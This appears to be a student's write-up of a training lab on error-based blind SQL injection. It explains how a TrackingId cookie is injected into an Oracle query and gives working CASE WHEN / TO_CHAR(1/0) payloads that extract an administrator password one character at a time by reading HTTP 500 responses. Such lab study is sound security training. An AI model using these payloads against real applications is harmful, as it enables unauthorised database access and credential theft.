# Lab: Blind SQL injection with conditional errors

### Instructions

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

### Solution

#### Concepts Covered

- Blind SQL injection with no visible response difference
- Error-based oracle — inferring data from conditional database errors
- CASE WHEN + division by zero as an error trigger
- Oracle DB specific syntax (SUBSTR, ||, TO_CHAR)
- HTTP 500 status code as the boolean signal
- Character-by-character password extraction via ASCII + SUBSTR

---

#### Vulnerability

The TrackingId cookie value is inserted unsanitised into an Oracle SQL query.
Unlike lab 09, the application returns no visible difference in page content
between a true and false condition — "Welcome back" does not exist here.
Instead, a true condition can be forced to trigger a database error (division
by zero), causing the application to return HTTP 500. A false condition returns
a normal HTTP 200.

Likely backend query:
```sql
SELECT * FROM tracking WHERE id = ''
```

Injecting via Oracle string concatenation:
```sql
SELECT * FROM tracking WHERE id = 'TRACKINGID' || (SELECT CASE WHEN
(condition) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE
username='administrator') || ''
```

True condition  → TO_CHAR(1/0) executes → division by zero → database error → HTTP 500  
False condition → ELSE '' returns empty string → no error → HTTP 200

---

#### Exploitation Approach

##### Step 1 — Confirm injection point

Append `'` to the TrackingId cookie. A single unmatched quote should cause a
500, confirming the input reaches the SQL query unsanitised.

Verify boolean control with:
- `' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '` → 500
- `' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '` → 200

##### Step 2 — Confirm administrator user exists

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

500 response confirms the administrator row exists in the users table.

##### Step 3 — Detect password length

Iterate `CASE WHEN LENGTH(password)=N` for N=1..50 until 500 fires.
Password length: **20**

##### Step 4 — Extract password

For each position 1–20, iterate ASCII values 32–126 testing:
`CASE WHEN ASCII(SUBSTR(password,N,1))=J`
Record the character when 500 fires. Repeat for all 20 positions.

---

#### Key Payloads

**Confirm boolean control:**

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

**Detect password length:**

```sql
' || (SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

**Extract character at position N:**

```sql
' || (SELECT CASE WHEN ASCII(SUBSTR(password,1,1))=97 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

---

#### Database — Oracle Specific Notes

This lab runs on an Oracle database. Key syntax differences from MySQL/PostgreSQL:

- String concatenation: `||` not `CONCAT()`
- Substring function: `SUBSTR()` not `SUBSTRING()`
- Error trigger: `TO_CHAR(1/0)` causes division by zero
- Test queries need `FROM dual` if not selecting from a real table
- No `--` comment needed here — the closing `|| '` keeps the query valid

---

#### Automation

Solved via Python script — see `sqli_10.py`

Manual exploitation is impractical for the same reasons as lab 09 — up to
20 positions × 94 possible chars = up to 1,880 requests. The error-based
approach also adds complexity since Burp Intruder Community Edition would
need manual inspection of status codes across hundreds of requests.

```
python3 sqli_10.py <LAB_URL>
python3 sqli_10.py <LAB_URL> http://127.0.0.1:8080  # with Burp proxy
```

#### Takeaways

- When page content gives you nothing, look at the HTTP status code — the
  oracle doesn't have to be visible text
- CASE WHEN is a powerful primitive: it lets you embed an if/else decision
  inside any SQL query, making it the foundation of error-based blind SQLi
- Division by zero (TO_CHAR(1/0)) is the standard Oracle error trigger —
  other databases have equivalents (e.g. 1/0 directly in MySQL, CAST errors
  in PostgreSQL)
- Oracle's || concatenation syntax is fundamentally different from MySQL/MSSQL
  injection patterns — database fingerprinting before exploitation matters
- The script architecture from lab 09 transferred almost unchanged — only
  the oracle function and payload builders needed updating, confirming that
  modular design pays off immediately